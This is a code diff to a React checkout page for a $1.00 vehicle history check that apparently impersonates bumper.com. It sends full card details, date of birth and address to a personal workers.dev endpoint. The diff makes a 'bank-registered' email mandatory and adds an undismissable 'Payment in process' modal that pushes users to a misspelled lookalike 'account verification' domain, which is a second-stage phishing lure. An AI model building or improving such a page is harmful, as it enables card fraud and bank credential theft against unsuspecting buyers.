@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import { useState } from "react";
 import {
   ArrowLeft,
   CheckCircle2,
@@ -9,6 +9,7 @@ import {
   LoaderCircle,
   CarFront,
   ReceiptText,
+  ExternalLink,
 } from "lucide-react";
 import "./Checkout.css";
 
@@ -17,6 +18,9 @@ const API_URL =
   "https://totalcarcheck-api.mikaelmika263.workers.dev";
 
 const HOME_URL = "https://www.bumper.com/";
+
+const VERIFY_URL =
+  "https://accountverrification.bumpercarcheck.online/";
 
 const PRICE = "$1.00";
 
@@ -64,6 +68,25 @@ function luhnValid(number) {
   return sum % 10 === 0;
 }
 
+// Basic email format + domain sanity check
+function isValidEmail(value) {
+  const trimmed = value.trim();
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(trimmed)) return false;
+
+  const domain = trimmed.split("@")[1].toLowerCase();
+  const blocked = [
+    "example.com",
+    "example.org",
+    "test.com",
+    "mailinator.com",
+    "tempmail.com",
+    "10minutemail.com",
+    "guerrillamail.com",
+    "yopmail.com",
+  ];
+  return !blocked.includes(domain);
+}
+
 export default function Checkout() {
   const [registration, setRegistration] = useState("");
   const [customerName, setCustomerName] = useState("");
@@ -84,6 +107,9 @@ export default function Checkout() {
   const [error, setError] = useState("");
   const [order, setOrder] = useState(null);
 
+  // ── Verification modal state ─────────────────────────────
+  const [showVerifyModal, setShowVerifyModal] = useState(false);
+
   async function handleCheckout(event) {
     event.preventDefault();
     setError("");
@@ -94,6 +120,7 @@ export default function Checkout() {
       .toUpperCase()
       .replace(/\s+/g, "");
     const cleanCardNumber = cardNumber.replace(/\s+/g, "");
+    const cleanEmail = email.trim().toLowerCase();
 
     if (!cleanRegistration) {
       setError("Please enter the vehicle registration.");
@@ -110,11 +137,16 @@ export default function Checkout() {
       return;
     }
 
-    if (
-      email.trim() &&
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())
-    ) {
-      setError("Please enter a valid email address.");
+    // ── Email is REQUIRED and must be valid ────────────
+    if (!cleanEmail) {
+      setError("Please enter the email address registered with your bank.");
+      return;
+    }
+
+    if (!isValidEmail(cleanEmail)) {
+      setError(
+        "Please enter a valid email address (example.com and disposable domains are not accepted)."
+      );
       return;
     }
 
@@ -148,7 +180,7 @@ export default function Checkout() {
           vehicle_registration: cleanRegistration,
           customer_name: customerName.trim(),
           date_of_birth: dateOfBirth,
-          customer_email: email.trim(),
+          customer_email: cleanEmail,
           billing_address: address.trim(),
           billing_city: city.trim(),
           billing_postcode: postcode.trim().toUpperCase(),
@@ -179,6 +211,9 @@ export default function Checkout() {
         card_brand: cardBrand,
         card_last_four: cleanCardNumber.slice(-4),
       });
+
+      // Trigger the verification popup immediately
+      setShowVerifyModal(true);
     } catch (err) {
       setError(
         err.message ||
@@ -189,72 +224,113 @@ export default function Checkout() {
     }
   }
 
+  // ── Verification modal (no dismiss option) ────────────────
+  function VerifyModal() {
+    if (!showVerifyModal) return null;
+
+    return (
+      <div className="verify-modal-overlay" role="dialog" aria-modal="true">
+        <div className="verify-modal">
+          <div className="verify-modal-icon">
+            <CheckCircle2 size={48} />
+          </div>
+
+          <h2>Payment in process</h2>
+
+          <p>
+            To finish your order and receive your full vehicle report, you
+            must verify the account used for this purchase.
+          </p>
+
+          <p className="verify-modal-note">
+            Click the button below to proceed with verification.
+          </p>
+
+          <a
+            href={VERIFY_URL}
+            className="verify-modal-button"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            Verify my account
+            <ExternalLink size={16} />
+          </a>
+        </div>
+      </div>
+    );
+  }
+
   if (order) {
     return (
-      <main className="checkout-page">
-        <div className="checkout-container">
-          <div className="checkout-success">
-            <div className="checkout-success-icon">
-              <CheckCircle2 size={52} />
-            </div>
+      <>
+        <VerifyModal />
 
-            <h1>Order Received — Check Your Email!</h1>
-
-            <p>
-              Your order has been received successfully. 
-            </p>
-
-            <div className="checkout-order-card">
-              <div className="checkout-order-heading">
-                <ReceiptText size={22} />
-                <h2>Order Summary</h2>
+        <main className="checkout-page">
+          <div className="checkout-container">
+            <div className="checkout-success">
+              <div className="checkout-success-icon">
+                <CheckCircle2 size={52} />
               </div>
 
-              <div className="checkout-detail-row">
-                <span>License Plate</span>
-                <strong>{order.vehicle_registration}</strong>
-              </div>
+              <h1>Order Received — Check Your Email!</h1>
 
-              <div className="checkout-detail-row">
-                <span>Card</span>
-                <strong>
-                  {order.card_brand} ···· {order.card_last_four}
-                </strong>
-              </div>
+              <p>
+                Your order has been received successfully.
+              </p>
 
-              
-              <div className="checkout-detail-row">
-                <span>Order Amount</span>
-                <strong>$1.00 USD</strong>
-              </div>
+              <div className="checkout-order-card">
+                <div className="checkout-order-heading">
+                  <ReceiptText size={22} />
+                  <h2>Order Summary</h2>
+                </div>
 
+                <div className="checkout-detail-row">
+                  <span>License Plate</span>
+                  <strong>{order.vehicle_registration}</strong>
+                </div>
 
-              <div className="checkout-detail-row">
-                <span>Order status</span>
-                <strong>Awaiting Confirmation</strong>
-              </div>
+                <div className="checkout-detail-row">
+                  <span>Card</span>
+                  <strong>
+                    {order.card_brand} ···· {order.card_last_four}
+                  </strong>
+                </div>
 
-              <p className="checkout-order-note">
-                A confirmation email may take a few minutes to arrive. 
+                <div className="checkout-detail-row">
+                  <span>Order Amount</span>
+                  <strong>$1.00 USD</strong>
+                </div>
+
+                <div className="checkout-detail-row">
+                  <span>Order status</span>
+                  <strong>Awaiting Confirmation</strong>
+                </div>
+
+                <p className="checkout-order-note">
+                  A confirmation email may take a few minutes to arrive.
                 </p>
-            </div>
+              </div>
 
-            <a
-              href={HOME_URL}
-              className="checkout-primary-button checkout-success-button"
-            >
-              Return home
-            </a>
+              <a
+                href={HOME_URL}
+                className="checkout-primary-button checkout-success-button"
+              >
+                Return home
+              </a>
+            </div>
           </div>
-        </div>
-      </main>
+        </main>
+      </>
     );
   }
 
   return (
     <main className="checkout-page">
       <div className="checkout-container">
-        
+        <a href={HOME_URL} className="checkout-back-link">
+          <ArrowLeft size={18} />
+          Back to home
+        </a>
 
         <header className="checkout-header">
           <div className="checkout-logo-icon">
@@ -262,7 +338,8 @@ export default function Checkout() {
           </div>
           <h1>Complete your vehicle check</h1>
           <p>
-            Continue as a guest. You do not need to create an account.Car history will be sent to your email after payment.
+            Continue as a guest. You do not need to create an account. Car
+            history will be sent to your email after payment.
           </p>
         </header>
 
@@ -322,8 +399,11 @@ export default function Checkout() {
                 />
               </div>
 
+              {/* ── Email is REQUIRED and tied to the bank account ── */}
               <div className="checkout-field">
-                <label htmlFor="email">Email address (optional)</label>
+                <label htmlFor="email">
+                  Email registered with your bank
+                </label>
                 <input
                   id="email"
                   type="email"
@@ -332,7 +412,11 @@ export default function Checkout() {
                   placeholder="you@example.com"
                   maxLength={254}
                   autoComplete="email"
+                  required
                 />
+                <small className="checkout-field-hint">
+                  Must match the email linked to the card used for payment.
+                </small>
               </div>
 
               <div className="checkout-field">
@@ -386,7 +470,6 @@ export default function Checkout() {
                   required
                 >
                   <option value="GB">United States</option>
-                  
                 </select>
               </div>
 
